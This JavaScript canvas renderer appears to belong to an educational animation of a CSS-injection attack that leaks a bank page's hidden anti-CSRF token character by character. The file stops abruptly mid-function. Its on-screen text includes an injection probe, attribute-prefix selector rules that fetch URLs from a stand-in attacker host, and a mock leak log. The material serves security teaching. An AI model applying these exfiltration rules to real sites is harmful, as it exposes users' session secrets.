// Realistic & Robust Vector Renderer with Dynamic Geometry & Safe Bounds
import { MathUtils } from './math.js';
import { I18N } from './i18n.js';

const FONT_FAMILY = "'Segoe UI', Roboto, -apple-system, system-ui, Arial, sans-serif";

export class Renderer {
  constructor(canvas, ctx) {
    this.canvas = canvas;
    this.ctx = ctx;
    this.time = 0;
    this.lang = 'vi';
  }

  get texts() {
    return I18N[this.lang] || I18N.vi;
  }

  // Draw deep cosmic space background
  drawBackground(width, height, camera) {
    const ctx = this.ctx;
    const bgGrad = ctx.createRadialGradient(
      width * 0.5, height * 0.45, 80,
      width * 0.5, height * 0.5, Math.max(width, height) * 0.85
    );
    bgGrad.addColorStop(0, '#0d1629');
    bgGrad.addColorStop(0.5, '#080c16');
    bgGrad.addColorStop(1, '#030508');

    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, width, height);
  }

  // Subtle coordinate grid in world space
  drawWorldGrid(ctx, camera) {
    ctx.save();
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.025)';
    ctx.lineWidth = 1;

    const gridSize = 120;
    const minX = -1920;
    const maxX = 1920;
    const minY = -1200;
    const maxY = 1200;

    ctx.beginPath();
    for (let x = minX; x <= maxX; x += gridSize) {
      ctx.moveTo(x, minY);
      ctx.lineTo(x, maxY);
    }
    for (let y = minY; y <= maxY; y += gridSize) {
      ctx.moveTo(minX, y);
      ctx.lineTo(maxX, y);
    }
    ctx.stroke();
    ctx.restore();
  }

  // Atmospheric auras behind the 3 primary territories
  drawTerritoryAuras(ctx, time) {
    ctx.save();

    // Attacker Realm aura (Left, Crimson)
    const attGrad = ctx.createRadialGradient(-600, 20, 40, -600, 20, 440);
    attGrad.addColorStop(0, 'rgba(244, 63, 94, 0.12)');
    attGrad.addColorStop(0.6, 'rgba(244, 63, 94, 0.025)');
    attGrad.addColorStop(1, 'rgba(244, 63, 94, 0)');
    ctx.fillStyle = attGrad;
    ctx.beginPath();
    ctx.arc(-600, 20, 440, 0, Math.PI * 2);
    ctx.fill();

    // Web App Realm aura (Center, Violet)
    const appGrad = ctx.createRadialGradient(0, -40, 40, 0, -40, 440);
    appGrad.addColorStop(0, 'rgba(99, 102, 241, 0.14)');
    appGrad.addColorStop(0.6, 'rgba(99, 102, 241, 0.025)');
    appGrad.addColorStop(1, 'rgba(99, 102, 241, 0)');
    ctx.fillStyle = appGrad;
    ctx.beginPath();
    ctx.arc(0, -40, 440, 0, Math.PI * 2);
    ctx.fill();

    // Victim Realm aura (Right, Cyan)
    const vicGrad = ctx.createRadialGradient(600, 10, 50, 600, 10, 460);
    vicGrad.addColorStop(0, 'rgba(6, 182, 212, 0.13)');
    vicGrad.addColorStop(0.6, 'rgba(16, 185, 129, 0.025)');
    vicGrad.addColorStop(1, 'rgba(6, 182, 212, 0)');
    ctx.fillStyle = vicGrad;
    ctx.beginPath();
    ctx.arc(600, 10, 460, 0, Math.PI * 2);
    ctx.fill();

    ctx.restore();
  }

  // Draw Realm Boundary Badges (Scene 1 & Overview)
  drawRealmMarkers(ctx, alpha = 1) {
    if (alpha <= 0.01) return;
    ctx.save();
    ctx.globalAlpha = alpha;

    const t = this.texts.realms;
    const realms = [
      { name: t.attacker.name, sub: t.attacker.sub, x: -600, color: '#f43f5e' },
      { name: t.app.name, sub: t.app.sub, x: 0, color: '#818cf8' },
      { name: t.victim.name, sub: t.victim.sub, x: 600, color: '#06b6d4' }
    ];

    for (const r of realms) {
      const py = -270;

      ctx.font = `700 13px ${FONT_FAMILY}`;
      const nameW = ctx.measureText(r.name).width;
      ctx.font = `500 11px ${FONT_FAMILY}`;
      const subW = ctx.measureText(r.sub).width;
      const boxW = Math.max(220, Math.max(nameW, subW) + 40);

      ctx.fillStyle = 'rgba(11, 17, 32, 0.92)';
      ctx.strokeStyle = MathUtils.rgba(r.color, 0.45);
      ctx.lineWidth = 1.5;
      ctx.shadowBlur = 12;
      ctx.shadowColor = MathUtils.rgba(r.color, 0.25);
      this.roundRect(ctx, r.x - boxW / 2, py - 24, boxW, 48, 24);
      ctx.fill();
      ctx.stroke();
      ctx.shadowBlur = 0;

      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';

      ctx.font = `700 13px ${FONT_FAMILY}`;
      ctx.fillStyle = r.color;
      ctx.fillText(r.name, r.x, py - 7);

      ctx.font = `500 11px ${FONT_FAMILY}`;
      ctx.fillStyle = '#94a3b8';
      ctx.fillText(r.sub, r.x, py + 12);
    }

    ctx.restore();
  }

  // Draw Attacker Entity (Left top: x: -600, y: -120)
  drawAttackerNode(ctx, x, y, options = {}) {
    const {
      highlight = false,
      alpha = 1,
      scale = 1,
      showPayloadDoc = false,
      payloadProgress = 0,
      showReconProbe = false
    } = options;

    if (alpha <= 0.01) return;

    ctx.save();
    ctx.globalAlpha = alpha;
    ctx.translate(x, y);
    ctx.scale(scale, scale);

    const mainColor = '#f43f5e';
    const time = this.time;
    const t = this.texts.nodes;
    const isVi = this.lang === 'vi';

    // Pulse rings
    const pulseRate = (time * 1.2) % 1;
    ctx.beginPath();
    ctx.arc(0, 0, 48 + pulseRate * 36, 0, Math.PI * 2);
    ctx.strokeStyle = MathUtils.rgba(mainColor, (1 - pulseRate) * 0.4);
    ctx.lineWidth = 1.8;
    ctx.stroke();

    // Node circle
    ctx.beginPath();
    ctx.arc(0, 0, 48, 0, Math.PI * 2);
    ctx.fillStyle = '#160e18';
    ctx.strokeStyle = highlight ? '#ffffff' : mainColor;
    ctx.lineWidth = highlight ? 3 : 2.2;
    ctx.shadowBlur = highlight ? 24 : 12;
    ctx.shadowColor = mainColor;
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Attacker Emblem
    ctx.strokeStyle = mainColor;
    ctx.lineWidth = 2.5;
    ctx.beginPath();
    ctx.moveTo(0, -22);
    ctx.lineTo(18, -8);
    ctx.lineTo(14, 18);
    ctx.lineTo(0, 24);
    ctx.lineTo(-14, 18);
    ctx.lineTo(-18, -8);
    ctx.closePath();
    ctx.fillStyle = 'rgba(244, 63, 94, 0.25)';
    ctx.fill();
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(0, 0, 4, 0, Math.PI * 2);
    ctx.fillStyle = '#ffffff';
    ctx.fill();

    // Labels
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    ctx.font = `700 14px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(t.attacker, 0, 68);

    ctx.font = `500 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#fda4af';
    ctx.fillText(t.attackerSub, 0, 86);

    // Reconnaissance Probe Box (Scene 2: How attacker spotted the vulnerability)
    if (showReconProbe) {
      const docY = 150 + Math.sin(time * 3) * 3;
      ctx.save();
      ctx.translate(0, docY);

      const cardW = 340;
      const cardH = 92;

      ctx.fillStyle = 'rgba(28, 14, 24, 0.96)';
      ctx.strokeStyle = '#f43f5e';
      ctx.lineWidth = 1.6;
      ctx.shadowBlur = 14;
      ctx.shadowColor = 'rgba(244, 63, 94, 0.45)';
      this.roundRect(ctx, -cardW / 2, -cardH / 2, cardW, cardH, 10);
      ctx.fill();
      ctx.stroke();
      ctx.shadowBlur = 0;

      ctx.textAlign = 'left';
      ctx.textBaseline = 'middle';
      ctx.font = `700 11px ${FONT_FAMILY}`;
      ctx.fillStyle = '#fda4af';
      ctx.fillText(isVi ? 'BƯỚC 1: DÒ TÌM & NHẬN DIỆN LỖ HỔNG (RECON)' : 'STEP 1: VULNERABILITY DISCOVERY (RECON)', -cardW / 2 + 14, -cardH / 2 + 16);

      ctx.font = '600 10.5px monospace';
      ctx.fillStyle = '#fde68a';
      ctx.fillText(`POST /theme?color=red"><style>body{...}`, -cardW / 2 + 14, -cardH / 2 + 38);

      ctx.font = `600 10px ${FONT_FAMILY}`;
      ctx.fillStyle = '#34d399';
      ctx.fillText(isVi ? '✓ Server chèn thẳng CSS vào HTML không qua lọc!' : '✓ Server reflects CSS directly into page unescaped!', -cardW / 2 + 14, -cardH / 2 + 60);
      ctx.fillStyle = '#38bdf8';
      ctx.fillText(isVi ? '✓ CSP cấm JavaScript -> Khai thác bằng CSS Injection!' : '✓ CSP blocks JS -> Attacker pivots to CSS Injection!', -cardW / 2 + 14, -cardH / 2 + 76);

      ctx.restore();
    }
    // Realistic Attack Rules Matrix Badge (Scene 3: Brute force matrix a-z)
    else if (showPayloadDoc) {
      const docAlpha = MathUtils.clamp(payloadProgress * 1.5, 0, 1);
      const docY = 150 + Math.sin(time * 3) * 3;

      ctx.save();
      ctx.globalAlpha = alpha * docAlpha;
      ctx.translate(0, docY);

      const cardW = 340;
      const cardH = 92;

      ctx.fillStyle = 'rgba(28, 14, 24, 0.96)';
      ctx.strokeStyle = '#f43f5e';
      ctx.lineWidth = 1.6;
      ctx.shadowBlur = 14;
      ctx.shadowColor = 'rgba(244, 63, 94, 0.45)';
      this.roundRect(ctx, -cardW / 2, -cardH / 2, cardW, cardH, 10);
      ctx.fill();
      ctx.stroke();
      ctx.shadowBlur = 0;

      ctx.textAlign = 'left';
      ctx.textBaseline = 'middle';
      ctx.font = `700 11px ${FONT_FAMILY}`;
      ctx.fillStyle = '#fda4af';
      ctx.fillText(isVi ? 'BẢNG QUY TẮC ĐOÁN KÝ TỰ (DICTIONARY a-z):' : 'BRUTE-FORCE DICTIONARY MATRIX (a-z):', -cardW / 2 + 14, -cardH / 2 + 16);

      ctx.font = '600 10px monospace';
      ctx.fillStyle = '#94a3b8';
      ctx.fillText(`input[value^="a"] { bg: url("//att/c=a"); }`, -cardW / 2 + 14, -cardH / 2 + 38);
      ctx.fillText(`input[value^="b"] { bg: url("//att/c=b"); }`, -cardW / 2 + 14, -cardH / 2 + 56);
      ctx.fillStyle = '#34d399';
      ctx.fillText(`input[value^="s"] { bg: url("//att/c=s"); }`, -cardW / 2 + 14, -cardH / 2 + 74);

      ctx.restore();
    }

    ctx.restore();
  }

  // Draw Attacker Server Node (Left bottom: x: -600, y: 160)
  drawAttackerServerNode(ctx, x, y, options = {}) {
    const {
      highlight = false,
      alpha = 1,
      scale = 1,
      isReceiving = false,
      receivedState = null
    } = options;

    if (alpha <= 0.01) return;

    ctx.save();
    ctx.globalAlpha = alpha;
    ctx.translate(x, y);
    ctx.scale(scale, scale);

    const mainColor = '#f43f5e';
    const time = this.time;
    const t = this.texts.nodes;
    const isVi = this.lang === 'vi';

    if (isReceiving || highlight) {
      for (let i = 0; i < 3; i++) {
        const ringProg = ((time * 1.6 + i * 0.33) % 1);
        ctx.beginPath();
        ctx.arc(0, 0, 38 + ringProg * 45, 0, Math.PI * 2);
        ctx.strokeStyle = MathUtils.rgba(mainColor, (1 - ringProg) * 0.55);
        ctx.lineWidth = 1.8;
        ctx.stroke();
      }
    }

    // Server Chassis
    ctx.fillStyle = '#180f1a';
    ctx.strokeStyle = highlight ? '#ffffff' : mainColor;
    ctx.lineWidth = highlight ? 3 : 2.2;
    ctx.shadowBlur = highlight ? 24 : 12;
    ctx.shadowColor = mainColor;
    this.roundRect(ctx, -52, -44, 104, 88, 12);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Server slots
    for (let i = -1; i <= 1; i++) {
      const sy = i * 22;
      ctx.fillStyle = 'rgba(244, 63, 94, 0.15)';
      this.roundRect(ctx, -42, sy - 7, 84, 14, 4);
      ctx.fill();

      const ledColor = ((time * 3 + i) % 2 > 0.8) ? '#ffffff' : '#f43f5e';
      ctx.beginPath();
      ctx.arc(32, sy, 3, 0, Math.PI * 2);
      ctx.fillStyle = ledColor;
      ctx.fill();

      ctx.beginPath();
      ctx.arc(22, sy, 3, 0, Math.PI * 2);
      ctx.fillStyle = '#38bdf8';
      ctx.fill();
    }

    // Antenna
    ctx.beginPath();
    ctx.moveTo(0, -44);
    ctx.lineTo(0, -62);
    ctx.strokeStyle = mainColor;
    ctx.lineWidth = 2.2;
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(0, -64, 4, 0, Math.PI * 2);
    ctx.fillStyle = highlight ? '#ffffff' : mainColor;
    ctx.fill();

    // Node Title
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    ctx.font = `700 13px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(t.attackerServer, 0, 64);

    ctx.font = `500 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#fda4af';
    ctx.fillText(t.attackerServerSub, 0, 81);

    // Realistic Nginx HTTP Access Log (Scene 8 & 9)
    if (receivedState) {
      ctx.save();
      const cardW = 280;
      const cardH = 74;

      ctx.translate(0, 142);
      ctx.fillStyle = 'rgba(24, 12, 22, 0.96)';
      ctx.strokeStyle = '#f43f5e';
      ctx.lineWidth = 1.6;
      ctx.shadowBlur = 16;
      ctx.shadowColor = '#f43f5e';
      this.roundRect(ctx, -cardW / 2, -cardH / 2, cardW, cardH, 8);
      ctx.fill();
      ctx.stroke();
      ctx.shadowBlur = 0;

      ctx.textAlign = 'left';
      ctx.textBaseline = 'middle';
      ctx.font = '700 10px monospace';
      ctx.fillStyle = '#fda4af';
      ctx.fillText(`[NGINX ACCESS LOG] 14:32:01`, -cardW / 2 + 12, -cardH / 2 + 16);
      ctx.fillStyle = '#34d399';
      ctx.fillText(`GET /leak?char=${receivedState} 200 OK`, -cardW / 2 + 12, -cardH / 2 + 37);
      ctx.font = `700 10.5px ${FONT_FAMILY}`;
      ctx.fillStyle = '#fbbf24';
      ctx.fillText(isVi ? `=> Ký tự đầu tiên chắc chắn là "${receivedState}"!` : `=> Deduces 1st char is "${receivedState}"!`, -cardW / 2 + 12, -cardH / 2 + 56);

      ctx.restore();
    }

    ctx.restore();
  }

  // Draw Vulnerable Web Application Node (Center: x: 0, y: -100)
  drawWebApplicationNode(ctx, x, y, options = {}) {
    const {
      highlight = false,
      alpha = 1,
      scale = 1,
      showAssembly = false,
      assemblyPhase = 0
    } = options;

    if (alpha <= 0.01) return;

    ctx.save();
    ctx.globalAlpha = alpha;
    ctx.translate(x, y);
    ctx.scale(scale, scale);

    const mainColor = '#818cf8';
    const time = this.time;
    const t = this.texts.nodes;

    if (highlight) {
      ctx.beginPath();
      ctx.arc(0, 0, 75, 0, Math.PI * 2);
      ctx.strokeStyle = 'rgba(129, 140, 248, 0.6)';
      ctx.lineWidth = 2.5;
      ctx.stroke();
    }

    // App Pod Chassis
    ctx.fillStyle = '#0e1224';
    ctx.strokeStyle = highlight ? '#ffffff' : mainColor;
    ctx.lineWidth = highlight ? 3.2 : 2.2;
    ctx.shadowBlur = highlight ? 26 : 14;
    ctx.shadowColor = mainColor;
    this.roundRect(ctx, -70, -56, 140, 112, 18);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Central core
    ctx.beginPath();
    ctx.arc(0, -10, 26, 0, Math.PI * 2);
    ctx.fillStyle = 'rgba(99, 102, 241, 0.28)';
    ctx.strokeStyle = '#a5b4fc';
    ctx.lineWidth = 1.8;
    ctx.fill();
    ctx.stroke();

    // Data flow rings
    ctx.beginPath();
    ctx.arc(0, -10, 16, time * 2, time * 2 + Math.PI * 1.5);
    ctx.strokeStyle = '#c7d2fe';
    ctx.lineWidth = 2.2;
    ctx.stroke();

    // Stack icon
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(-10, -13, 20, 3.5);
    ctx.fillRect(-10, -8, 20, 3.5);
    ctx.fillRect(-10, -3, 20, 3.5);

    // Labels
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    ctx.font = `700 14px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(t.webApp, 0, 76);

    ctx.font = `500 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#c7d2fe';
    ctx.fillText(t.webAppSub, 0, 94);

    // Assembly Pipeline (Scene 4)
    if (showAssembly) {
      this.drawAssemblyPipeline(ctx, 0, 175, assemblyPhase);
    }

    ctx.restore();
  }

  // Draw Realistic Page Assembly (Scene 4: Unsanitized HTML Response)
  drawAssemblyPipeline(ctx, ox, oy, progress) {
    ctx.save();
    ctx.translate(ox, oy);

    const isVi = this.lang === 'vi';
    const frameW = 560;
    const frameH = 115;

    ctx.fillStyle = 'rgba(15, 23, 42, 0.96)';
    ctx.strokeStyle = 'rgba(129, 140, 248, 0.55)';
    ctx.lineWidth = 1.8;
    ctx.shadowBlur = 18;
    ctx.shadowColor = 'rgba(99, 102, 241, 0.35)';
    this.roundRect(ctx, -frameW / 2, -frameH / 2, frameW, frameH, 14);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Header label
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.font = `700 11.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#a5b4fc';
    ctx.fillText(isVi ? 'SERVER CHÈN THẲNG DỮ LIỆU VÀO TRANG HTML (KHÔNG ESCAPE):' : 'SERVER RENDERS UNESCAPED HTML (STORED / REFLECTED):', 0, -frameH / 2 + 18);

    const stageW = 160;
    const stageH = 58;
    const cardCenterY = 16;

    const stages = [
      { name: '<style> ĐỘC HẠI', sub: 'input[value^="s"]{...}', x: -180, color: '#f43f5e' },
      { name: isVi ? 'SERVER NỐI THẲNG' : 'UNSANITIZED RENDER', sub: isVi ? 'Không lọc ký tự đặc biệt' : 'No input sanitization', x: 0, color: '#818cf8' },
      { name: 'FORM BÍ MẬT', sub: 'name="csrf" value="secret"', x: 180, color: '#06b6d4' }
    ];

    for (let i = 0; i < stages.length; i++) {
      const s = stages[i];
      ctx.fillStyle = 'rgba(30, 41, 59, 0.7)';
      ctx.strokeStyle = s.color;
      ctx.lineWidth = 1.5;

      this.roundRect(ctx, s.x - stageW / 2, cardCenterY - stageH / 2, stageW, stageH, 8);
      ctx.fill();
      ctx.stroke();

      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';

      ctx.font = '700 10.5px monospace';
      ctx.fillStyle = s.color;
      ctx.fillText(s.name, s.x, cardCenterY - 10);

      ctx.font = '500 9.5px monospace';
      ctx.fillStyle = '#cbd5e1';
      ctx.fillText(s.sub, s.x, cardCenterY + 12);
    }

    // Connectors
    for (let i = 0; i < 2; i++) {
      const arrowX = -90 + i * 180;
      ctx.beginPath();
      ctx.moveTo(arrowX - 8, cardCenterY);
      ctx.lineTo(arrowX + 8, cardCenterY);
      ctx.lineTo(arrowX + 3, cardCenterY - 5);
      ctx.moveTo(arrowX + 8, cardCenterY);
      ctx.lineTo(arrowX + 3, cardCenterY + 5);
      ctx.strokeStyle = '#c7d2fe';
      ctx.lineWidth = 1.8;
      ctx.stroke();
    }

    ctx.restore();
  }

  // Draw Victim Browser with Realistic F12 Network Tab & DOM Inspection (Right side: x: 600, y: 10)
  drawVictimBrowser(ctx, x, y, options = {}) {
    const {
      highlight = false,
      alpha = 1,
      scale = 1,
      deepInspection = false,
      stateValue = 'secret_42',
      selectedPath = null,
      showBarrier = false,
      showF12Network = false
    } = options;

    if (alpha <= 0.01) return;

    ctx.save();
    ctx.globalAlpha = alpha;
    ctx.translate(x, y);
    ctx.scale(scale, scale);

    const bw = 550;
    const bh = 390;

    // Window Chassis
    ctx.fillStyle = '#0b1322';
    ctx.strokeStyle = highlight ? '#38bdf8' : 'rgba(6, 182, 212, 0.65)';
    ctx.lineWidth = highlight ? 3 : 2.2;
    ctx.shadowBlur = highlight ? 28 : 16;
    ctx.shadowColor = 'rgba(6, 182, 212, 0.35)';
    this.roundRect(ctx, -bw / 2, -bh / 2, bw, bh, 14);
    ctx.fill();
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Browser Chrome Header
    const chromeH = 38;
    ctx.fillStyle = 'rgba(15, 23, 42, 0.95)';
    this.roundRectTop(ctx, -bw / 2, -bh / 2, bw, chromeH, 14);
    ctx.fill();

    // Dots
    const dotColors = ['#f43f5e', '#f59e0b', '#10b981'];
    for (let i = 0; i < 3; i++) {
      ctx.beginPath();
      ctx.arc(-bw / 2 + 20 + i * 15, -bh / 2 + chromeH / 2, 4, 0, Math.PI * 2);
      ctx.fillStyle = dotColors[i];
      ctx.fill();
    }

    // Address Bar
    const urlBarW = 280;
    ctx.fillStyle = 'rgba(30, 41, 59, 0.85)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
    ctx.lineWidth = 1;
    this.roundRect(ctx, -bw / 2 + 75, -bh / 2 + 8, urlBarW, 22, 11);
    ctx.fill();
    ctx.stroke();

    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.font = '500 10.5px monospace';
    ctx.fillStyle = '#94a3b8';
    ctx.fillText('https://bank.internal/transfer', -bw / 2 + 88, -bh / 2 + 19);

    // Browser Title Badge
    ctx.textAlign = 'right';
    ctx.font = `700 11.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#38bdf8';
    ctx.fillText('VICTIM BROWSER', bw / 2 - 18, -bh / 2 + 19);

    // VIEWPORT CONTENT
    if (!deepInspection) {
      this.drawBrowserOverviewContent(ctx, bw, bh);
    } else {
      this.drawBrowserRealisticEngine(ctx, {
        stateValue,
        selectedPath,
        showBarrier,
        showF12Network
      });
    }

    // Label below browser
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    ctx.font = `700 14px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(this.texts.nodes.victimClient, 0, bh / 2 + 26);

    ctx.font = `500 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#67e8f9';
    ctx.fillText(this.texts.nodes.victimClientSub, 0, bh / 2 + 44);

    ctx.restore();
  }

  // Draw clean overview inside browser window (Scenes 1-4)
  drawBrowserOverviewContent(ctx, bw, bh) {
    const isVi = this.lang === 'vi';
    const topY = -bh / 2 + 55;

    // Simulated banking dashboard
    ctx.fillStyle = 'rgba(30, 41, 59, 0.45)';
    this.roundRect(ctx, -bw / 2 + 24, topY, bw - 48, 38, 8);
    ctx.fill();

    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.font = `700 11.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#ffffff';
    ctx.fillText(isVi ? 'TÀI KHOẢN NGÂN HÀNG: VICTIM_VIP  |  SỐ DƯ: 100,000,000 VNĐ' : 'BANK ACCOUNT: VICTIM_VIP  |  BALANCE: $50,000.00', -bw / 2 + 38, topY + 19);

    // Two content cards
    const cardW = (bw - 64) / 2;
    ctx.fillStyle = 'rgba(30, 41, 59, 0.35)';
    this.roundRect(ctx, -bw / 2 + 24, topY + 48, cardW, 95, 8);
    this.roundRect(ctx, 8, topY + 48, cardW, 95, 8);
    ctx.fill();

    // 3 Visual Layer Strips
    const layers = isVi ? [
      { name: '1. Cấu Trúc HTML Gốc (Chứa Form chuyển tiền)', color: '#06b6d4' },
      { name: '2. Thẻ Input Bí Mật: <input type="hidden" name="csrf" value="secret_42">', color: '#10b981' },
      { name: '3. Stylesheet CSS Bị Tiêm Độc: input[value^="s"] { background: url(...) }', color: '#f59e0b' }
    ] : [
      { name: '1. Original HTML Document (Contains Transfer Form)', color: '#06b6d4' },
      { name: '2. Secret Hidden Input: <input type="hidden" name="csrf" value="secret_42">', color: '#10b981' },
      { name: '3. Injected Malicious CSS: input[value^="s"] { background: url(...) }', color: '#f59e0b' }
    ];

    const stripStartY = topY + 160;
    const stripH = 30;
    const stripGap = 10;

    for (let i = 0; i < layers.length; i++) {
      const l = layers[i];
      const ly = stripStartY + i * (stripH + stripGap);

      ctx.fillStyle = 'rgba(30, 41, 59, 0.65)';
      ctx.strokeStyle = l.color;
      ctx.lineWidth = 1.4;

      this.roundRect(ctx, -bw / 2 + 24, ly, bw - 48, stripH, 7);
      ctx.fill();
      ctx.stroke();

      ctx.beginPath();
      ctx.arc(-bw / 2 + 42, ly + stripH / 2, 4, 0, Math.PI * 2);
      ctx.fillStyle = l.color;
      ctx.fill();

      ctx.textAlign = 'left';
      ctx.textBaseline = 'middle';
      ctx.font = '600 11px monospace';
      ctx.fillStyle = '#ffffff';
      ctx.fillText(l.name, -bw / 2 + 56, ly + stripH / 2);
    }
  }

  // Draw Realistic Internal Engine: Shows DOM input, CSS selector comparison, and F12 Network request!
  drawBrowserRealisticEngine(ctx, state) {
    const { stateValue, selectedPath, showBarrier, showF12Network } = state;
    const isVi = this.lang === 'vi';

    // 1. TOP BOX: Protected Target DOM Element
    const domY = -140;
    const domH = 52;
    const domW = 500;

    ctx.fillStyle = 'rgba(16, 185, 129, 0.1)';
    ctx.strokeStyle = '#10b981';
    ctx.lineWidth = 1.6;
    this.roundRect(ctx, -domW / 2, domY, domW, domH, 8);
    ctx.fill();
    ctx.stroke();

    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.font = `700 10.5px ${FONT_FAMILY}`;
    ctx.fillStyle = '#34d399';
    ctx.fillText(isVi ? 'PHẦN TỬ DOM CỦA NẠN NHÂN (Chứa Secret Token do ngân hàng cấp):' : 'TARGET DOM ELEMENT (Contains Anti-CSRF Secret Token):', -domW / 2 + 14, domY + 15);

    ctx.font = '700 12px monospace';
    ctx.fillStyle = '#ffffff';
    ctx.fillText(`<input type="hidden" name="csrf" value="${stateValue}">`, -domW / 2 + 14, domY + 35);

    // 2. MIDDLE ZONE: CSS Selector Matching Rules Comparison (Step-by-step)
    const midY = -76;
    const midH = 92;
    const midW = 500;

    ctx.fillStyle = 'rgba(245, 158, 11, 0.08)';
    ctx.strokeStyle = '#f59e0b';
    ctx.lineWidth = 1.6;
    this.roundRect(ctx, -midW / 2, midY, midW, midH, 8);
    ctx.fill();
    ctx.stroke();

    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.font = `700 11px ${FONT_FAMILY}`;
    ctx.fillStyle = '#fbbf24';
    ctx.fillText(isVi ? 'CƠ CHẾ SO KHỚP TIỀN TỐ TRỰC QUAN (CSS Selector ^=):' : 'CSS PREFIX MATCHING LOGIC (Selector ^=):', -midW / 2 + 14, midY + 16);

    // Test Rule 1: Starts with 'a'
    ctx.font = '600 10px monospace';
    ctx.fillStyle = '#94a3b8';
    ctx.fillText(`• Thử 'a': input[value^="a"] => "secret_42" bắt đầu bằng "a"? => ❌ SAI (Im lặng)`, -midW / 2 + 14, midY + 38);

    // Test Rule 2: Starts with 'b'
    ctx.fillText(`• Thử 'b': input[value^="b"] => "secret_42" bắt đầu bằng "b"? => ❌ SAI (Im lặng)`, -midW / 2 + 14, midY + 54);

    // Test Rule 3: Starts with 's'
    const isMatchedS = (selectedPath === 's' || selectedPath === 'A' || selectedPath === 'secret' || selectedPath === 'secret_42');
    ctx.font = '700 10.5px monospace';
    ctx.fillStyle = isMatchedS ? '#34d399' : '#94a3b8';
    ctx.fillText(`• Thử 's': input[value^="s"] => "secret_42" bắt đầu bằng "s"? => ${isMatchedS ? '✅ ĐÚNG! (KÍCH HOẠT TẢI ẢNH NỀN)' : 'Chờ kiểm tra...'}`, -midW / 2 + 14, midY + 72);

    // 3. BARRIER OR F12 NETWORK ACTIVITY (Bottom Zone)
    const botY = 28;
    const botH = 140;
    const botW = 500;

    if (showBarrier) {
      ctx.fillStyle = 'rgba(239, 68, 68, 0.12)';
      ctx.strokeStyle = '#ef4444';
      ctx.lineWidth = 1.8;
      this.roundRect(ctx, -botW / 2, botY, botW, botH, 10);
      ctx.fill();
      ctx.stroke();

      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.font = `700 12px ${FONT_FAMILY}`;
      ctx.fillStyle = '#fca5a5';
      ctx.fillText(isVi ? 'TẠI SAO KẺ TẤN CÔNG KHÔNG DÙNG JAVASCRIPT (XSS)?' : 'WHY CSS INJECTION INSTEAD OF JAVASCRIPT (XSS)?', 0, botY + 22);

      ctx.font = `500 10.5px ${FONT_FAMILY}`;
      ctx.fillStyle = '#ffffff';
      ctx.fillText(isVi ? '1. Trang web áp dụng Content Security Policy (CSP): "script-src \'self\'" -> CHẶN ĐỨNG JS!' : '1. Page enforces Content Security Policy (CSP): "script-src \'self\'" -> BLOCKS JS!', 0, botY + 48);
      ctx.fillText(isVi ? '2. Kẻ xấu KHÔNG THỂ gọi fetch() hay đọc document.cookie bằng script.' : '2. Attacker CANNOT execute fetch() or read memory variables with script.', 0, botY + 68);
      ctx.fillText(isVi ? '3. Nhưng CSP vẫn cho phép CSS chạy! CSS không đọc được biến JS trực tiếp...' : '3. However, CSP permits CSS rules! While CSS cannot directly read JS memory...', 0, botY + 88);

      ctx.font = `700 11px ${FONT_FAMILY}`;
      ctx.fillStyle = '#38bdf8';
      ctx.fillText(isVi ? '=> Buộc phải dùng bộ chọn CSS để ép trình duyệt gọi HTTP ra ngoài (Kênh Kề)!' : '=> It forces the browser to issue an external HTTP GET request (Side-Channel)!', 0, botY + 114);
    } else {
      // Realistic F12 Network Monitor Tab
      ctx.fillStyle = 'rgba(15, 23, 42, 0.96)';
      ctx.strokeStyle = '#06b6d4';
      ctx.lineWidth = 1.8;
      this.roundRect(ctx, -botW / 2, botY, botW, botH, 10);
      ctx.fill();
      ctx.stroke();

      // Tab bar
      ctx.fillStyle = 'rgba(30, 41, 59, 0.9)';
      this.roundRectTop(ctx, -botW / 2, botY, botW, 26, 10);
      ctx.fill();

      ctx.textAlign = 'left';
      ctx.textBaseline = 'middle';
      ctx.font = `700 10px ${FONT_FAMILY}`;
      ctx.fillStyle = '#38bdf8';
      ctx.fillText(isVi ? '🔴 NHẬT KÝ MẠNG TRÌNH DUYỆT (F12 NETWORK MONITOR)' : '🔴 BROWSER F12 NETWORK MONITOR', -botW / 2 + 14, botY + 13);

      // Network log entries
      ctx.font = '600 10px monospace';
      ctx.fillStyle = '#94a3b8';
      ctx.fillText('STATUS  METHOD  URL                                          INITIATOR', -botW / 2 + 14, botY + 44);

      ctx.beginPath();
